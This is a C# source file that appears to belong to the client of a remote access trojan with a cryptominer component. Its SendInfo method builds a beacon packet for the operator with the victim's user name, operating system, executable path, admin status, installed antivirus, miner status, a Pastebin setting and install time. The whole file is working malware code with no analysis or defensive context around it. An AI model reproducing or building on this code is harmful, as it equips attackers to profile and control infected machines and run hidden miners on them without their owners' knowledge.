﻿using Client.MessagePack;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Client.Helper
{
    public static class IdSender
    {
        public static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = Settings.Hwid;
            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
            msgpack.ForcePathObject("Path").AsString = Application.ExecutablePath;
            msgpack.ForcePathObject("Version").AsString = Settings.Version;
            msgpack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
            msgpack.ForcePathObject("Performance").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}";
            msgpack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
            msgpack.ForcePathObject("Antivirus").AsString = Methods.Antivirus();
            msgpack.ForcePathObject("Installed").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
            msgpack.ForcePathObject("Pong").AsString = "";
            return msgpack.Encode2Bytes();
        }
    }
}
